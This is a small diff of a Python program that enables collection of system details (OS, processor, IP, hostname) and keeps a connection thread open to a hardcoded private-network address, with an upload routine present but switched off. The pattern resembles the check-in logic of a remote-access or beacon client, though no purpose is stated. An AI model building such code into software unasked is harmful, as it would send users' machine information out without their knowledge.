@@ -12,8 +12,8 @@ class main:
         self.base_url = "http://10.247.71.196:6969"
         self.ip = "10.247.71.196"
         self.port = 4969
-        # self.grab_specs()
-        threading.Thread(target=self.constant_connection, args=()).start()
+        self.grab_specs()
+        threading.Thread(target=self.constant_connection).start()
     def grab_specs(self):
         self.os_type = platform.platform()
         self.processor = platform.processor()
@@ -32,7 +32,7 @@ class main:
         # print(self.processor)
         # print(self.ip_address)
         # print(self.host_name)
-        self.upload_data()
+        # self.upload_data()
 
     def upload_data(self):
         print("Sending request...")
